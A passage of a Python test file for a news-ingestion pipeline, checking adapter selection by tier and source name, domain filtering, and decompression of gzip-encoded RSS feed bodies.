    assert health.status == "ok"
    assert "sinks missing tables" not in health.detail


# ---------------------------------------------------------------- run.py wiring


class _Settings:
    gdelt_enabled = False


def test_build_adapters_excludes_evidence_by_default():
    """A default run is unchanged: no rss_evidence unless asked for by name."""
    from src.ingestion.run import build_adapters
    from src.ingestion.source_registry import SourceTier as RT

    all_tiers = [RT.TIER1, RT.TIER2, RT.TIER3, RT.TIER4]
    assert "rss_evidence" not in {a.name for a in build_adapters(_Settings(), all_tiers, None)}
    assert "rss_evidence" not in {a.name for a in build_adapters(_Settings(), all_tiers, [])}
    assert "rss_evidence" not in {a.name for a in build_adapters(_Settings(), all_tiers, [""])}
    # The named-source path still sees exactly the set it did before.
    assert {a.name for a in build_adapters(_Settings(), [RT.TIER3], ["reddit_tier3"])} == {
        "reddit_tier3"
    }
    assert {a.name for a in build_adapters(_Settings(), [RT.TIER1], ["rss_tier1"])} == {
        "rss_tier1"
    }


def test_build_adapters_selects_evidence_by_name():
    """--sources rss_evidence selects it, and no tier gating applies."""
    from src.ingestion.run import build_adapters
    from src.ingestion.source_registry import SourceTier as RT

    for tiers in ([], [RT.TIER1], [RT.TIER3], [RT.TIER1, RT.TIER2, RT.TIER3, RT.TIER4]):
        adapters = build_adapters(_Settings(), tiers, sources=["rss_evidence"])
        assert [a.name for a in adapters] == ["rss_evidence"], f"tiers={tiers}"


def test_build_adapters_evidence_alongside_a_tier_adapter():
    """Naming rss_evidence with another source returns both, evidence last."""
    from src.ingestion.run import build_adapters
    from src.ingestion.source_registry import SourceTier as RT

    adapters = build_adapters(_Settings(), [RT.TIER1], sources=["rss_tier1", "rss_evidence"])
    assert [a.name for a in adapters] == ["rss_tier1", "rss_evidence"]


def test_sources_help_text_mentions_evidence():
    """--sources help lists rss_evidence so it is discoverable."""
    import src.ingestion.run as run_module

    assert parse_args(["--sources", "rss_evidence"]).sources == "rss_evidence"
    help_line = next(
        line
        for line in inspect.getsource(run_module.parse_args).splitlines()
        if "Comma separated adapter names" in line
    )
    assert "rss_evidence" in help_line


def test_ingestion_results_include_evidence_key():
    """results["phases"]["ingestion"] carries an rss_evidence count."""
    import src.ingestion.run as run_module

    source = inspect.getsource(run_module.run_ingestion)
    assert '"rss_evidence": rss_evidence_count' in source
    assert "RSS evidence: {rss_evidence_count}" in source

# ---------------------------------------------------------------------------
# gzip bodies (2026-10-02, batch-coverage)
#
# news.un.org and middleeasteye.net answer 200 with content-encoding: gzip.
# urllib does not decode that, so the raw magic bytes used to reach
# parse_feed_xml, which reported 0 items and made two live feeds look dead.
# ---------------------------------------------------------------------------


def test_maybe_decompress_inflates_gzip_body():
    import gzip

    from src.ingestion.rss_evidence import maybe_decompress, parse_feed_xml

    xml = (
        b'<?xml version="1.0"?><rss version="2.0"><channel><item>'
        b"<title>UN steps up aid</title><link>https://news.un.org/feed/view/en/story/1</link>"
        b"</item></channel></rss>"
    )
    items = parse_feed_xml(maybe_decompress(gzip.compress(xml)))
    assert [i["title"] for i in items] == ["UN steps up aid"]


def test_maybe_decompress_passes_through_plain_and_broken_gzip():
    from src.ingestion.rss_evidence import GZIP_MAGIC, maybe_decompress

    assert maybe_decompress(b"<rss/>") == b"<rss/>"
    # Magic bytes that do not inflate are handed back unchanged, not raised on
    # and not silently emptied: the parser still gets to report the bad body.
    broken = GZIP_MAGIC + b"\x00truncated"
    assert maybe_decompress(broken) == broken
    assert maybe_decompress(b"") == b""


def test_fetch_feed_polite_returns_decoded_body(monkeypatch):
    """The 200 path decodes, so callers never see gzip magic bytes."""
    import gzip

    from src.ingestion import rss_evidence

    payload = gzip.compress(b'<?xml version="1.0"?><rss version="2.0"><channel><item><title>x</title><link>https://news.un.org/feed/view/en/story/1</link></item></channel></rss>')

    class _Resp:
        status = 200
        headers = {"Content-Encoding": "gzip"}

        def read(self):
            return payload

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

    monkeypatch.setattr(rss_evidence, "urlopen", lambda request, timeout=None: _Resp())
    status, body, _, _, _ = rss_evidence.fetch_feed_polite("https://news.un.org/feed")
    assert status == 200
    assert not body.startswith(rss_evidence.GZIP_MAGIC)
    assert rss_evidence.parse_feed_xml(body)[0]["title"] == "x"


def test_rss_adapter_sweeps_every_tier_source_without_a_domain_filter():
    """No filter means the whole tier, unchanged."""
    from src.ingestion.adapters.rss_adapter import RssAdapter
    from src.ingestion.source_registry import get_enabled_sources_by_tier
    from src.ingestion.source_registry import SourceTier as RT

    adapter = RssAdapter(RT.TIER2)
    assert adapter.domains is None
    assert adapter.sources() == get_enabled_sources_by_tier(RT.TIER2)


def test_rss_adapter_narrows_to_the_requested_domains():
    from src.ingestion.adapters.rss_adapter import RssAdapter
    from src.ingestion.source_registry import SourceTier as RT

    adapter = RssAdapter(RT.TIER2, domains={"allafrica.com"})
    swept = adapter.sources()
    assert set(swept) == {"allafrica.com"}
    # A domain that is disabled or unknown is not resurrected by the filter.
    assert RssAdapter(RT.TIER2, domains={"scmp.com"}).sources() == {}


def test_build_adapters_narrows_the_tier_adapter_to_a_named_domain(capsys):
    """--sources <domain> polls that domain, not the whole tier.

    It used to select the whole tier-2 adapter for any named tier-2 domain and
    then print "matched no adapter" for the very domain it had just matched, so
    a domain-scoped run was indistinguishable from a full tier run in the log.
    """
    from src.ingestion.run import build_adapters
    from src.ingestion.source_registry import SourceTier as RT

    adapters = build_adapters(_Settings(), [RT.TIER2], sources=["allafrica.com"])
    assert [a.name for a in adapters] == ["rss_tier2"]
    assert adapters[0].domains == {"allafrica.com"}
    assert "matched no adapter" not in capsys.readouterr().out


def test_build_adapters_keeps_the_whole_tier_when_every_domain_is_named():
    from src.ingestion.run import build_adapters
    from src.ingestion.source_registry import get_enabled_sources_by_tier
    from src.ingestion.source_registry import SourceTier as RT

    wanted = sorted(get_enabled_sources_by_tier(RT.TIER2))
    adapters = build_adapters(_Settings(), [RT.TIER2], sources=wanted)
    assert [a.name for a in adapters] == ["rss_tier2"]
    assert adapters[0].domains is None


def test_build_adapters_warns_only_for_genuinely_unmatched_entries(capsys):
    from src.ingestion.run import build_adapters
    from src.ingestion.source_registry import SourceTier as RT

    build_adapters(_Settings(), [RT.TIER2], sources=["allafrica.com", "not-a-real-domain.example"])
    out = capsys.readouterr().out
    assert "not-a-real-domain.example" in out
    assert "allafrica.com" not in out
